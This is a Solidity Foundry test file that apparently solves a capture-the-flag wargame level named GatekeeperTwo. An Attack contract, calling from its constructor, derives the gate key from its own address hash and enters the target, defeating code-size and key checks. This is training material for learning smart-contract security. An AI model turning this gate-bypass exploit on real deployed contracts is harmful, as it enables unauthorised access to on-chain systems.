// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/14_GatekeeperTwo.sol";

contract GatekeeperTwoTest is Test {
    GatekeeperTwo instance;
    Attack attacker;
    address player1;

    function setUp() public {
        player1 = vm.addr(1);

        instance = new GatekeeperTwo();
    }

    function testattacker() public {
        vm.startPrank(player1, player1);
        attacker = new Attack(address(instance));
        assertEq(instance.entrant(), player1);
        vm.stopPrank();
    }
}

contract Attack {
    GatekeeperTwo instance;

    constructor(address fb) {
        instance = GatekeeperTwo(fb);

        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^
            0xFFFFFFFFFFFFFFFF;
        instance.enter(gateKey);
    }
}
